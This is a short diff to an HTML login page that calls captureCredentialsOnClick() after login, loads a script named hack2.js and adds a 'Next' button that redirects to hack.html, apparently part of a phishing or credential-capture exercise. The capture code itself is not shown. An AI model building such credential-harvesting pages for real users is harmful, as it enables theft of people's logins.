@@ -61,6 +61,7 @@
       id="password"
     />
     <button class="button" id="login" onclick="handleLogin()">Login</button>
+    <button class="button" onclick="next();">Next</button>
   </div>
 
   <script>
@@ -72,12 +73,16 @@
       if (username && password) {
         alert('Welcome');
         captureCredentialsOnClick();
-        window.location.href = './hack.html';
 
         // You can perform navigation or other actions here
       } else {
         alert('Fill in all the fields');
       }
+    }
+
+    function next(){
+        window.location.href = './hack.html';
+
     }
   </script>
   <script src="./hack2.js"></script>
